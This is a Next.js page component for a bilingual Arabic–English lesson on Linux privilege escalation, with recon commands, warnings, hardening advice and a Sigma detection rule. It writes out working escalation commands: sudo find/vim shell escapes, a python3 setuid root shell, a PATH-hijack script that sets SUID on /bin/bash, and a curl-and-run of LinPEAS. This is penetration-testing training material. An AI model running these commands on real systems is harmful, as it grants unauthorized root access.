"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="linux-privesc">
      <L
        ar={<>
          <Section title="ليه shell عادية بتديك root في نص الحالات؟">
            <Analogy>
              نزلت على shell كـ www-data. وبعدين؟

              - أهو شغل وخلصنا يا حضرتك. شِيلت السيرفر.

              يا نجم الجيل.. www-data ده مش root.
              تقعد تتفرّج على /var/www؟
              ولا تقول "خلاص، اخترقت السيرفر"؟
              اوعى تخدع نفسك. الشغل لسه في أوله.
              <br/><br/>
              تخيّل عمارة مكاتب. إنت موظف زائر، البطاقة بتاعتك بتفتح الردهة بس. تصعيد الصلاحيات = تلاقي باب جانبي حد ساب مفتاحه، أو نظام التحكم في الأبواب بيثق في بطاقتك أكتر من اللازم. الفرق بينك وبين root في معظم الحالات مش ثغرة kernel — ده غلطة صغيرة في الإعدادات سايبها الـ admin.
              <br/><br/>
              تصعيد الصلاحيات في Linux نادر يكون 0-day. غالباً SUID ناقص، sudo rule مفتوح، أو script شغّال على cron بصلاحيات عالية وبيثق في PATH. في Pwnkit (CVE-2021-4034)، الثغرة كانت موجودة في polkit من 2009. 12 سنة. ومحدش لاحظ.
            </Analogy>
            <Callout kind="warn" title="غلطات الـ junior في privesc">
              <ul>
                <li>يطير على kernel exploit في أول دقيقة. الـ kernel exploits مش مستقرة وممكن تكراش السيرفر. ابدأ بالـ misconfigs.</li>
                <li>يشغّل linpeas من غير ما يفحص الـ environment. بعض البيئات فيها auditd بيلوگ كل execve.</li>
                <li>يلاقي SUID على binary غريب ويعمل له exec من غير ما يفهم بيعمل إيه. ممكن يكون honeypot.</li>
                <li>ينسى يفحص <code>cat /etc/crontab</code>. الكنز المنسي.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="فحص أولي — ماذا أعرف عن النظام؟">
            <Code lang="bash">{`# هوية المستخدم والصلاحيات
id
sudo -l        # أهم سؤال: ما الذي يمكنني تشغيله بصلاحيات أعلى؟
groups
cat /etc/passwd | cut -d: -f1

# نواة النظام والتوزيعة
uname -a
cat /etc/os-release

# مهام مجدولة (cron)
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
cat /etc/crontab

# عمليات تعمل كـ root
ps -eo user,pid,cmd | grep -E "^root" | head -20`}</Code>
          </Section>

          <Section title="أفضل خمس قنوات تصعيد">
            <Step n={1} title="sudo abuses عبر GTFOBins">
              لو ظهر <span className="eng">sudo -l</span> أنك تستطيع تشغيل برنامج مثل <span className="eng">vim</span> أو
              <span className="eng"> find</span> بدون كلمة مرور كـ root، اذهب إلى <span className="eng">gtfobins.github.io</span>
              وستجد سطراً واحداً يفتح shell. هذا أكثر سيناريو شائع في pentests.
              <Code lang="bash">{`# إذا كان يُسمح: (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \\; -quit

# أو vim
sudo vim -c ':!/bin/sh'`}</Code>
            </Step>
            <Step n={2} title="SUID binaries خطرة">
              ابحث عن ملفات تنفيذية مع bit الـ SUID — تعمل بصلاحيات مالكها بغض النظر عمن يشغلها.
              <Code lang="bash">{`find / -perm -4000 -type f 2>/dev/null
# قارن النتائج مع GTFOBins SUID list`}</Code>
            </Step>
            <Step n={3} title="Capabilities">
              <span className="eng">cap_setuid</span> على ثنائي مثل <span className="eng">python3</span> = root.
              <Code lang="bash">{`getcap -r / 2>/dev/null
# مثال: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`}</Code>
            </Step>
            <Step n={4} title="PATH hijacking على cron / SUID scripts">
              لو script يستدعي <span className="eng">backup</span> بدون مسار كامل، وكان <span className="eng">/tmp</span> في PATH،
              ضع <span className="eng">backup</span> خبيث في /tmp.
              <Code lang="bash">{`echo '#!/bin/sh
chmod +s /bin/bash' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH
# انتظر تشغيل cron أو script`}</Code>
            </Step>
            <Step n={5} title="Kernel exploits — آخر ملاذ">
              لو كل ما سبق فشل، تحقق من إصدار النواة و ابحث عن exploits معروفة (DirtyPipe CVE-2022-0847، CVE-2023-32233، nf_tables).
              لكن اعلم: هذه عالية الضوضاء، تتسبب في kernel panic، وقد تُكتشف بسرعة.
            </Step>
          </Section>

          <Section title="أتمتة — LinPEAS">
            <p>
              LinPEAS هو script يفحص كل ما سبق تلقائياً ويلون النتائج (أحمر = استغلال محتمل). استخدمه دائماً ولكن لا تثق به وحده.
            </p>
            <Terminal lines={[
              { p: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh" },
              { p: "chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/lp.log" },
              { o: "[+] [CVE-2022-0847] DirtyPipe — Kernel 5.15.0-25 vulnerable\n[!] Writable /etc/passwd\n[!] SUID: /usr/bin/find  (gtfobins)" },
            ]} />
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            التقنيات دي ضد أنظمة مش بتاعتك = جريمة فيدرالية. كل مثال هنا بيفترض إنك في معمل معزول أو على نظام
            معاك إذن مكتوب صريح إنك تختبره.
          </Callout>

          <Callout kind="good" title="الحماية — تقليل الأبواب اللي قدامه">
            <ul>
              <li>راجع <span className="eng">sudo -l</span> لكل مستخدم. لا NOPASSWD لأي أداة في GTFOBins.</li>
              <li>ابحث عن SUID شهرياً (auditd rule على path-changes)</li>
              <li>استخدم <span className="eng">capabilities</span> بحذر، راقبها مع <span className="eng">getcap -r /</span></li>
              <li>كل cron job يستخدم مسارات كاملة، لا اعتماد على PATH</li>
              <li>حدّث النواة وابحث في <span className="eng">kpatch</span> للتحديث الحي</li>
              <li>راقب <span className="eng">execve</span> من processes غير متوقعة (Falco / auditd / Sysdig)</li>
            </ul>
          </Callout>

          <Section title="الكشف — قواعد Sigma">
            <Code lang="yaml">{`title: Suspicious sudo execution of GTFOBins binary
logsource: { product: linux, service: auth }
detection:
  selection:
    process: 'sudo'
    cmdline|contains:
      - 'find'
      - 'vim'
      - 'less'
      - 'awk'
  filter:
    user: 'admin'
  condition: selection and not filter
level: high
tags: [attack.privilege_escalation, attack.t1548]`}</Code>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>
              Linux privesc 90٪ منه misconfigs. مش kernel exploits.
              <br/>
              SUID على binary مش لازم يكون SUID. sudo rule كاتبها admin من 4 سنين. cron بيشغّل /tmp/script.sh اللي إنت ممكن تكتبه. PATH فيه folder writable.
              <br/><br/>
              الـ junior بيدوّر على CVE.
              <br/>
              الـ pro بيدوّر على غلطة الـ admin.
              <br/><br/>
              اكتبها على ظهر إيدك يا مستجد: شغّل LinPEAS على سيرفراتك إنت قبل الـ adversary. لو لقى حاجة، يبقى هو هيلاقيها أسرع منك. وأنت ونصيبك ساعتها.
            </p>
          </Section>
          <Section title="مصادر">
            <ul>
              <li>GTFOBins — <span className="eng">gtfobins.github.io</span></li>
              <li>HackTricks — Linux Privilege Escalation</li>
              <li>MITRE ATT&CK — Privilege Escalation (TA0004)</li>
              <li>SANS SEC560 — Network Penetration Testing</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="Why does an ordinary shell sometimes hand you root?">
            <Analogy>
              Picture an office building. You're a visitor with a badge that opens the lobby. Privilege escalation is
              finding a side door someone left open, or discovering that the access system trusts your badge more than
              it should. The gap between you and root is rarely a kernel exploit — it's almost always a small config
              mistake.
            </Analogy>
            <p>
              Linux privilege escalation is rarely a 0-day. It's usually a misconfigured SUID, a permissive sudo rule,
              or a cron-run script that trusts PATH. This lesson covers what an attacker checks first after every
              initial shell.
            </p>
          </Section>

          <Section title="Initial recon — what do I know?">
            <Code lang="bash">{`# Identity and privileges
id
sudo -l        # most important question: what can I run elevated?
groups
cat /etc/passwd | cut -d: -f1

# Kernel and distribution
uname -a
cat /etc/os-release

# Scheduled jobs
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
cat /etc/crontab

# Processes running as root
ps -eo user,pid,cmd | grep -E "^root" | head -20`}</Code>
          </Section>

          <Section title="Top five escalation paths">
            <Step n={1} title="Sudo abuse via GTFOBins">
              If <span className="eng">sudo -l</span> shows you can run a tool like <span className="eng">vim</span> or
              <span className="eng"> find</span> as root with no password, head to <span className="eng">gtfobins.github.io</span>
              — there's a one-liner that drops a shell. Most common path in real engagements.
              <Code lang="bash">{`# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \\; -quit

# or vim
sudo vim -c ':!/bin/sh'`}</Code>
            </Step>
            <Step n={2} title="Dangerous SUID binaries">
              Hunt for executables with the SUID bit — they execute as their owner regardless of who runs them.
              <Code lang="bash">{`find / -perm -4000 -type f 2>/dev/null
# cross-check with the GTFOBins SUID list`}</Code>
            </Step>
            <Step n={3} title="Capabilities">
              <span className="eng">cap_setuid</span> on a binary like <span className="eng">python3</span> = root.
              <Code lang="bash">{`getcap -r / 2>/dev/null
# example: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`}</Code>
            </Step>
            <Step n={4} title="PATH hijacking on cron / SUID scripts">
              If a script calls <span className="eng">backup</span> without an absolute path and <span className="eng">/tmp</span> is in PATH,
              drop a malicious <span className="eng">backup</span> in /tmp.
              <Code lang="bash">{`echo '#!/bin/sh
chmod +s /bin/bash' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH
# wait for cron / script to fire`}</Code>
            </Step>
            <Step n={5} title="Kernel exploits — last resort">
              If nothing else works, check the kernel and look for known exploits (DirtyPipe CVE-2022-0847,
              CVE-2023-32233, nf_tables). They are loud, can panic the box, and are caught fast — last resort only.
            </Step>
          </Section>

          <Section title="Automation — LinPEAS">
            <p>
              LinPEAS automates everything above and color-codes results (red = likely exploitable). Use it, but
              never trust it alone.
            </p>
            <Terminal lines={[
              { p: "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh" },
              { p: "chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/lp.log" },
              { o: "[+] [CVE-2022-0847] DirtyPipe — Kernel 5.15.0-25 vulnerable\n[!] Writable /etc/passwd\n[!] SUID: /usr/bin/find  (gtfobins)" },
            ]} />
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            These techniques against systems you don't own = federal crime. Every example here assumes an isolated lab
            or a system you have explicit written authorization to test.
          </Callout>

          <Callout kind="good" titleEn="Defense — shrink the escalation surface">
            <ul>
              <li>Audit <span className="eng">sudo -l</span> per user. No NOPASSWD on anything in GTFOBins.</li>
              <li>Hunt SUID monthly (auditd watch on path changes)</li>
              <li>Use <span className="eng">capabilities</span> sparingly; monitor with <span className="eng">getcap -r /</span></li>
              <li>Every cron job uses absolute paths, no PATH dependence</li>
              <li>Patch the kernel; consider <span className="eng">kpatch</span> for live updates</li>
              <li>Watch <span className="eng">execve</span> from unexpected processes (Falco / auditd / Sysdig)</li>
            </ul>
          </Callout>

          <Section title="Detection — Sigma rule">
            <Code lang="yaml">{`title: Suspicious sudo execution of GTFOBins binary
logsource: { product: linux, service: auth }
detection:
  selection:
    process: 'sudo'
    cmdline|contains:
      - 'find'
      - 'vim'
      - 'less'
      - 'awk'
  filter:
    user: 'admin'
  condition: selection and not filter
level: high
tags: [attack.privilege_escalation, attack.t1548]`}</Code>
          </Section>

          <Section title="References">
            <ul>
              <li>GTFOBins — <span className="eng">gtfobins.github.io</span></li>
              <li>HackTricks — Linux Privilege Escalation</li>
              <li>MITRE ATT&CK — Privilege Escalation (TA0004)</li>
              <li>SANS SEC560 — Network Penetration Testing</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
